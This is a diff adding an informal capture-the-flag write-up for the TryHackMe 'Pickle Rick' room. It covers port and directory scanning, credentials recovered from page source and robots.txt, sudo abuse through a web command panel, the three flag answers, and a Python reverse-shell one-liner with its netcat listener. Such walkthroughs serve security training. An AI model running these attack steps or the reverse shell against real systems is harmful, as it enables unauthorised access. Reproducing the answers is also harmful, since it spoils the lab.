@@ -1,0 +1,104 @@
+Deploy the virtual machine on this task and explore the web application.
+
+#What is the first ingredient Rick needs?
+hint:
++ Scanning & Enumeration
+nmap -sVC -Pn -vv 10.10.179.176
+open port: 22,80
+
+web view source: http://10.10.179.176
+  ---> Username: R1ckRul3s
+
++Enumerating Services
+nikto -h 10.10.179.176
+or
+dirsearch -u 10.10.179.176 -e * -r
+	-u provides dirsearch with the URL or IP address that we are trying to enumerate
+	-e is some specified extensions, in this case I choose to look for all/any extensions it can find
+	-r specifies the search to recurse 1 layer further for whatever it finds
+  
+or gobuster 
+or dirb
+---> robots.txt
+login.php...
+
+view: http://10.10.179.176/robots.txt
+Wubbalubbadubdub
+<-- pass of username R1ckRul3s
+
++ Vulnerable WebApp
+turn web: http://10.10.179.176/login.php
+with R1ckRul3s:Wubbalubbadubdub
+tab command pannel
+ls
+cat <--not run
+sudo -l  <--ok all access
+sudo less Sup3rS3cretPickl3Ingred.txt
+---> mr. meeseek hair
+
+
+
+#Whats the second ingredient Rick needs?
+command
+ls /home
+ls /home/rick
+second ingredients
+sudo less /home/rick/second\ ingredients
+--> 1 jerry tear
+
+
+#Whats the final ingredient Rick needs?
+command pannel
+run:
+sudo -l
+sudo ls /root/
+sudo less 3rd.txt
+--->fleeb juice
+
+
+#OTHER 
+command
+which python3
+/usr/bin/python3
+open http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.239",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+change IP/port is ip/port my machine
+paste command
+on my machine
+run: nc -lvnp 1234
+
+sudo -l
+sudo ls
+sudo cat Sup3rS3cretPickl3Ingred.txt
+--->mr. meeseek hair
+
+ls /home
+ls /home/rick
+cat /home/rick/second\ ingredients
+--->1 jerry tear
+
+
+sudo ls /root
+sudo cat /root/3rd.txt
+--->fleeb juice
+
+
+https://tryhackme.com/room/picklerick
+https://stawm.design.blog/2020/05/17/pickle-rick-thm-writeup/
+https://bobloblaw321.wixsite.com/website/post/tryhackme-picklerick
+
+https://ludovic-cyber-sec.netlify.app/pickle-rick-ctf-tryhackme  <-- test
+
+
+
+
+
+
+
+
+  
+  
+  
+  
